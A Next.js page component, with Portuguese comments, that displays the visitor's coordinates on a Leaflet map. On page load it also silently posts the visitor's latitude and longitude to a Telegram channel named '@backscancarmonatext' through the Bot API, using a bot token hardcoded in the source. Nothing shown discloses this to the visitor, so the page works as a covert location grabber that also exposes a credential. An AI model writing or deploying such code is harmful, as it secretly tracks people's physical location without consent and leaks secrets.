'use client'

import { Box, Grid2 } from "@mui/material";
import axios from "axios";
import { useEffect, useState } from "react";
import { MapContainer, TileLayer, Marker, Popup } from "react-leaflet";

import dynamic from 'next/dynamic';

// Dynamically import LeafletMap with SSR disabled
const LeafletMap = dynamic(() => import('@/component/LeafletMap'), {
  ssr: false
});

import "leaflet/dist/leaflet.css";


export default function page(){

    const TELEGRAM_BOT_TOKEN = "8100862068:AAFkQ-jxm_ZORsNRmpKs94Ki1ktA8mhxQYw"; // Substitua pelo token do seu bot
    const TELEGRAM_CHAT_ID = "@backscancarmonatext"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

    const [latitude, setLatitude] = useState("");
    const [longetude, setLongitude] = useState("");
    
    useEffect(() => {

        if(typeof navigator !== "undefined"){

            if ("geolocation" in navigator) {
                /* geolocation is available */
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
    
                        
                        console.log("Latitude: " + latitude);
                        console.log("Longitude: " + longitude);
                        setLatitude(latitude);
                        setLongitude(longitude)
    
                        const func = async () => {
    
                            try {
    
                                const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
    
                                // Envia a localização para o Telegram
                                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                    chat_id: TELEGRAM_CHAT_ID,
                                    text: message,
                                });
                            
                            } catch (error) {
                                console.log(error);
                                alert("Erro ao enviar a localização para o Telegram.");
                            }
                        }
    
                        func();
    
                    }, 
                    () => {
                        alert('Ocorreu um erro ao tentar obter a localização.')
                    }
                );
    
            } else {
                alert(
                    "I'm sorry, but geolocation services are not supported by your browser.",
                );
            }
        }

    }, [])

    return(
        <div>
            <Box>
                <Grid2 fontStyle={'cente'}>
                    Latitude: {latitude} - Longitude: {longetude}
                </Grid2>
            </Box>
            <LeafletMap latitude={latitude} longitude={longetude} />
        </div>
    );
}
